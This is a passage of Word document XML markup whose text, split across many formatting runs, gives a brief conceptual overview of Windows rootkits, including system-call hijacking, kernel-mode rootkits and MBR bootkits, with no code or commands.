      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>akes a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>ys</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>em</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ca</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>execu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">on of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>hat</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>fo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:t>s a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>prede</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>mi</w:t>
      </w:r>
      <w:r>
        <w:t>ned</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>pa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>h and a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-11"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ndows roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>can h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:t>ack</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>em</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>at</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> m</w:t>
      </w:r>
      <w:r>
        <w:t>any</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>po</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ong</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>hat</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>pa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>h.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="3" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="1020" w:bottom="280" w:left="1140" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:t>Kernel</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="43"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ode</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="41"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>sKernel</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="43"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>are</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="41"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="43"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>oo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>hat</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="43"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>run</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="43"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>kernel</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="43"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>pa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:t>e,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>hence</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="43"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ak</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="44"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="74" w:line="288" w:lineRule="auto"/>
        <w:ind w:left="120" w:right="84"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>rea</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ll</w:t>
      </w:r>
      <w:r>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="30"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>hard</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="30"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>de</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>en</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>oper</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="30"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>ys</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>em</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="29"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>wou</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>be</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ered</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="30"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>process,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>wh</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="30"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:t>ou</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>d he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">p </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he process of h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he fa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>ys</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>em</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>pro</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>sed.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="287" w:lineRule="auto"/>
        <w:ind w:left="120" w:right="71" w:firstLine="710"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>MBR roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>Bo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">can </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nfe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ar</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>up</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">code </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ke </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er Boot</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>cord</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>(MBR),</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-31"/>
        </w:rPr>
        <w:t>V</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e Boot R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
